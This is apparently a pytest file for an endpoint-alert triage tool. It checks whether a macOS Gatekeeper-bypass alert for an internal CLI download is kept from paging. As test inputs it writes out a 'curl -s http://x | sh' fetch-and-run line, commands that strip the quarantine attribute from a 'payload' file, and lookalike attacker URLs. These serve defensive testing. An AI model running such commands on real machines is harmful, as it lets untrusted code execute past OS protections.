"""File origin + 30-day prevalence (DEMO-121950: our unsigned JIT tool paged as a Gatekeeper bypass).

Run: python -m pytest edr_triage/file_origin_test.py -q
"""
from __future__ import annotations

import pytest

from edr_triage import file_origin as F
from lib import kql_templates as T

H = "45a7955c330088558e1956ef49da3d8862411d860983bf457e56f156f5462ccc"
JIT = "https://jit.example.com/download/cli/s3/mac_arm64"


def _row(dev, origins, first="2026-11-12T10:50:32Z"):
    return {"DeviceName": dev, "Origins": origins, "FirstSeen": first,
            "Paths": [f"/Users/x/Downloads/jit-cli-s3"]}


def test_applies_only_to_provenance_alerts_with_a_hash():
    assert F.applies("macOS Gatekeeper bypass", H)
    assert not F.applies("macOS Gatekeeper bypass", "")
    assert not F.applies("Suspicious PowerShell command line", H)


def test_internal_label_is_exact_host_and_path():
    assert F.internal_label(JIT)
    assert F.internal_label("https://acme-security-appsec-automation.s3.ap-south-1.amazonaws.com/jit-access/x")
    assert not F.internal_label("https://jit.example.com.evil.com/download/x")
    assert not F.internal_label("http://jit.example.com/download/x")
    assert not F.internal_label("https://jit.example.com/other/x")
    assert not F.internal_label("https://evil.com/?u=https://jit.example.com/download/")


def test_sim_121950_shape_is_internal():
    rows = [_row("i186kshektemac2", [JIT]), _row("u1313ssintemac1.acme.local", [JIT]),
            _row("e1515hpandtemac", [])]
    s = F.summarize(rows, "u1313ssintemac1")
    assert s["devices"] == 3 and s["internal_origin"] and s["external_origins"] == 0
    text = "\n".join(F.prompt_lines(s))
    assert "INTERNAL" in text and "install step" in text


def test_one_external_copy_anywhere_spoils_it():
    rows = [_row("u1313ssintemac1", [JIT]), _row("other", ["https://files.example.net/jit-cli-s3"])]
    s = F.summarize(rows, "u1313ssintemac1")
    assert not s["internal_origin"] and s["external_origins"] == 1
    assert "does not clear" in "\n".join(F.prompt_lines(s))


def test_alert_device_without_a_recorded_origin_is_not_internal():
    s = F.summarize([_row("u1313ssintemac1", []), _row("b", [JIT])], "u1313ssintemac1")
    assert not s["internal_origin"]


def test_failed_check_says_so():
    text = "\n".join(F.prompt_lines({"ok": False, "error": "MDE token unavailable"}))
    assert "COULD NOT BE CHECKED" in text


def test_prevalence_kql_is_30_day_per_device_and_strips_query_strings():
    q = T.mde_file_prevalence(H, anchor_iso="2026-11-12T10:54:40Z")
    assert "datetime(2026-11-12T10:54:40Z) - 29d" in q and f'SHA256 =~ "{H}"' in q
    assert "split(FileOriginUrl, '?')[0]" in q and "by DeviceName" in q
    with pytest.raises(ValueError):
        T.mde_file_prevalence("not-a-hash")


def test_hunt_file_returns_the_download_source():
    q = T.mde_file(sha256=H)
    assert "FileOriginUrl" in q and "FileOriginReferrerUrl" in q and "InitiatingProcessCommandLine" in q


# ── Paging: an internal tool's install step does not phone (the ticket still goes to L2) ──

from edr_triage.paging_rules import internal_install_quiet as Q  # noqa: E402

CMDS = ["xattr -d com.apple.quarantine jit-cli-s3", "-zsh", "chmod +x jit-cli-s3"]


def _ev(cmds=CMDS, rows=None):
    rows = rows or [_row("u1313ssintemac1", [JIT]), _row("b", [JIT])]
    return {"command_lines": cmds, "file_origin": F.summarize(rows, "u1313ssintemac1")}


def test_sim_121950_does_not_page():
    assert Q("macOS Gatekeeper bypass", _ev())


def test_pages_when_any_copy_came_from_outside():
    rows = [_row("u1313ssintemac1", [JIT]), _row("b", ["https://evil.example/jit-cli-s3"])]
    assert not Q("macOS Gatekeeper bypass", _ev(rows=rows))


def test_pages_when_anything_else_ran():
    assert not Q("macOS Gatekeeper bypass", _ev(CMDS + ["./jit-cli-s3 --profile prod x"]))
    assert not Q("macOS Gatekeeper bypass", _ev(CMDS + ["curl -s http://x | sh"]))


def test_pages_when_the_command_targets_another_file():
    assert not Q("macOS Gatekeeper bypass", _ev(["xattr -d com.apple.quarantine payload", "chmod +x payload"]))
    assert not Q("macOS Gatekeeper bypass", _ev(["xattr -d com.apple.other jit-cli-s3"]))


def test_pages_without_evidence_or_commands_or_for_other_alerts():
    assert not Q("macOS Gatekeeper bypass", {})
    assert not Q("macOS Gatekeeper bypass", _ev(cmds=[]))
    assert not Q("macOS Gatekeeper bypass", _ev(cmds=["-zsh"]))
    assert not Q("macOS Gatekeeper bypass", {"command_lines": CMDS, "file_origin": {"ok": False}})
    assert not Q("Reverse shell", _ev())


def test_urgent_still_pages_and_the_quiet_page_is_recorded(monkeypatch):
    import asyncio
    from types import SimpleNamespace
    from lib import paging
    from edr_triage import paging_rules as P
    seen = []
    monkeypatch.setattr(paging, "type_key", lambda n: "k")
    monkeypatch.setattr(paging, "type_rule", lambda k: "")
    monkeypatch.setattr(paging, "first_occurrence", lambda k: False)
    monkeypatch.setattr(paging, "observe", lambda *a, **k: seen.append(a))

    async def _offer(*a, **k):
        return {"action": "page"}
    monkeypatch.setattr(paging, "offer", _offer)
    t = SimpleNamespace(alert_name="macOS Gatekeeper bypass", triage_class="NEEDS_L2", action_taken="",
                        jira_key="DEMO-121950", device_name="u1313ssintemac1", user_name="s", llm_reasoning="")
    assert asyncio.run(P.maybe_page(t, "https://j", _ev()))["action"] == "observed" and seen
    assert asyncio.run(P.maybe_page(t, "https://j", {}))["action"] == "page"
    t.triage_class = "URGENT"
    assert asyncio.run(P.maybe_page(t, "https://j", _ev()))["action"] == "page"
